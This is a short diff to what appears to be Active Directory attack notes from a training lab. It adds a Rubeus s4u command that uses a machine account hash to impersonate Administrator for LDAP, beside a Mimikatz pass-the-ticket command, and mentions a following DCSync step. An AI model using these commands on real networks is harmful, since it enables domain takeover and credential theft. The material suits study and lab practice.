@@ -343,6 +343,11 @@ then inject the ticket with mimikatz:
 ```
 Invoke-Mimikatz -Command '"kerberos::ptt <Ticket.kirbi>"'
 ```
+or
+### with rubeus
+```
+.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.local" /altservice:ldap /ptt
+```
 -> then we can dcsync with mimikatz because we got ldap tgs as domain admin
 
 --------------------------------------------------------------
